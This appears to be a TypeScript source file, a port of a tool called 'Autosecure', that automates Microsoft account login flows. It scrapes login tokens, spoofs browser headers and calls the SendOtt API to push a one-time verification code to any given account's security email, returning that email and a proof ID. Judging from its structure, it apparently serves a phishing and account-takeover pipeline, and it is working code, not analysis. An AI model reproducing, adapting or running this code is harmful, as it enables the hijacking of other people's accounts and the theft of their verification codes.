import { CookieJar, fetchWithJar } from "./cookie-jar.js";

/**
 * Exact port of Autosecure-main/views/utils/sendOtt.py
 * Must run on VPS — Vercel datacenter IPs often fail MS OTP.
 */

function decodeUnicode(s: string): string {
  return s.replace(/\\u([0-9A-Fa-f]{4})/g, (_, hex) =>
    String.fromCharCode(parseInt(hex, 16)),
  );
}

async function getLiveData(jar: CookieJar): Promise<{ urlPost: string; ppft: string }> {
  const res = await fetchWithJar(jar, "https://login.live.com", {
    method: "POST",
    headers: {
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
    },
  });
  const text = await res.text();

  const urlPostMatch =
    text.match(
      /https:\/\/login\.live\.com\/ppsecure\/post\.srf\?contextid=[0-9a-zA-Z]{1,100}&opid=[0-9a-zA-Z]{1,100}&bk=[a-zA-Z0-9]{1,100}&uaid=[0-9a-zA-Z]{1,100}&pid=0/,
    ) || text.match(/https:\/\/login\.live\.com\/ppsecure\/post\.srf\?[^"'\\\s]+/);
  if (!urlPostMatch) throw new Error("Failed to extract urlPost");

  const ppftMatch =
    text.match(/name="PPFT"[^>]*value="([^"]+)"/) ||
    text.match(/value=\\?"([^"]+)"/);
  if (!ppftMatch) throw new Error("Failed to extract PPFT");

  return { urlPost: urlPostMatch[0], ppft: ppftMatch[1] };
}

async function getCredentialType(
  jar: CookieJar,
  email: string,
): Promise<{
  proofs: Array<Record<string, string>>;
  isAuthenticator: boolean;
}> {
  const live = await getLiveData(jar);
  const res = await fetch("https://login.live.com/GetCredentialType.srf", {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json; charset=utf-8",
      Referer: "https://login.live.com/",
      Cookie: jar.getHeader() || "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691",
      hpgact: "0",
      hpgid: "33",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    },
    body: JSON.stringify({
      checkPhones: true,
      country: "",
      federationFlags: 3,
      flowToken: live.ppft,
      forceotclogin: true,
      isCookieBannerShown: true,
      isExternalFederationDisallowed: true,
      isFederationDisabled: true,
      isFidoSupported: true,
      isOtherIdpSupported: false,
      isRemoteConnectSupported: false,
      isRemoteNGCSupported: true,
      isSignup: false,
      otclogindisallowed: false,
      username: email,
    }),
  });
  const setCookies =
    typeof (res.headers as Headers & { getSetCookie?: () => string[] }).getSetCookie ===
    "function"
      ? (res.headers as Headers & { getSetCookie: () => string[] }).getSetCookie()
      : res.headers.get("set-cookie")
        ? [res.headers.get("set-cookie")!]
        : [];
  for (const c of setCookies) jar.setFromResponse("https://login.live.com", c);

  const data = (await res.json()) as Record<string, unknown>;
  const creds = (data.Credentials as Record<string, unknown>) ?? null;
  if (creds?.RemoteNgcParams) {
    return { proofs: [], isAuthenticator: true };
  }
  const proofs =
    (creds?.OtcLoginEligibleProofs as Array<Record<string, string>>) || [];
  return { proofs, isAuthenticator: false };
}

/** Autosecure sendOtt.py port */
async function sendOttAutosecure(
  jar: CookieJar,
  email: string,
  securityEmail: string,
): Promise<boolean> {
  try {
    const data = await getLiveData(jar);

    const loginData = await fetchWithJar(jar, data.urlPost, {
      method: "POST",
      headers: {
        host: "login.live.com",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: "https://login.live.com",
        Referer: "https://login.live.com/",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
      },
      body: new URLSearchParams({
        ps: "2",
        PPFT: data.ppft,
        PPSX: "Pass",
        login: email,
        loginfmt: email,
        type: "11",
        passwd: "",
      }).toString(),
    });
    const loginText = await loginData.text();

    const action = loginText.match(/action="([^"]+)"/)?.[1];
    const iptRaw = loginText.match(/name="ipt"[^>]+value="([^"]+)"/)?.[1];
    const pprid = loginText.match(/name="pprid"[^>]+value="([^"]+)"/)?.[1];
    if (!action || !iptRaw || !pprid) {
      console.error("[otp-send] missing action/ipt/pprid");
      return false;
    }
    const ipt = decodeURIComponent(iptRaw);

    const identityConfirm = await fetchWithJar(jar, action, {
      method: "POST",
      headers: {
        host: "account.live.com",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: "https://login.live.com",
        Referer: "https://login.live.com/",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
      },
      body: new URLSearchParams({ pprid, ipt }).toString(),
    });
    const identityText = await identityConfirm.text();

    const rawStr = identityText.match(/"rawProofList"\s*:\s*"([^"]+)"/);
    if (!rawStr) {
      console.error("[otp-send] No rawProofList found");
      return false;
    }
    const raw = JSON.parse(decodeUnicode(rawStr[1])) as Array<Record<string, string>>;
    const epid =
      raw.find((p) => p.type === "Email" && p.epid)?.epid ?? raw[0]?.epid;
    if (!epid) {
      console.error("[otp-send] No epid");
      return false;
    }

    const apiCanary = decodeUnicode(
      identityText.match(/"apiCanary"\s*:\s*"([^"]+)"/)?.[1] || "",
    );
    const eipt = decodeUnicode(identityText.match(/"eipt"\s*:\s*"([^"]+)"/)?.[1] || "");
    const uaid = identityText.match(/"uaid"\s*:\s*"([^"]+)"/)?.[1] || "";
    if (!apiCanary || !eipt || !uaid) {
      console.error("[otp-send] missing canary/eipt/uaid");
      return false;
    }

    const resp = await fetchWithJar(jar, "https://account.live.com/api/Proofs/SendOtt", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        hpgid: "200368",
        scid: "100166",
        canary: apiCanary,
        eipt,
        uaid,
        uiflvr: "1001",
        hpgact: "0",
      },
      body: JSON.stringify({
        token: "",
        purpose: "UnfamiliarLocationHard",
        epid,
        autoVerification: false,
        autoVerificationFailed: false,
        confirmProof: securityEmail,
        uaid,
        uiflvr: 1001,
        scid: 100166,
        hpgid: 200368,
      }),
    });

    const t = await resp.text().catch(() => "");
    console.log("[otp-send] SendOtt status:", resp.status, t.slice(0, 200));
    return resp.status === 200;
  } catch (e) {
    console.error("[otp-send] Error:", e);
    return false;
  }
}

export async function sendOtpFromWorker(email: string): Promise<{
  ok: boolean;
  securityEmail?: string;
  proofId?: string;
  error?: string;
}> {
  try {
    const jar = new CookieJar();
    const cred = await getCredentialType(jar, email);
    if (cred.isAuthenticator) {
      return { ok: false, error: "Authenticator-only account (no email OTP)" };
    }
    if (!cred.proofs.length) {
      return { ok: false, error: "No email OTP proofs on this Microsoft account" };
    }

    const selected = cred.proofs[0];
    const securityEmail = selected.display || "unknown";
    const proofId = selected.data || "";

    const jar2 = new CookieJar();
    const ok = await sendOttAutosecure(jar2, email, securityEmail);
    if (ok) return { ok: true, securityEmail, proofId };
    return {
      ok: false,
      error: "Failed to send verification code (SendOtt). Try again.",
      securityEmail,
      proofId,
    };
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    console.error("[otp-send] error:", msg);
    return { ok: false, error: msg };
  }
}
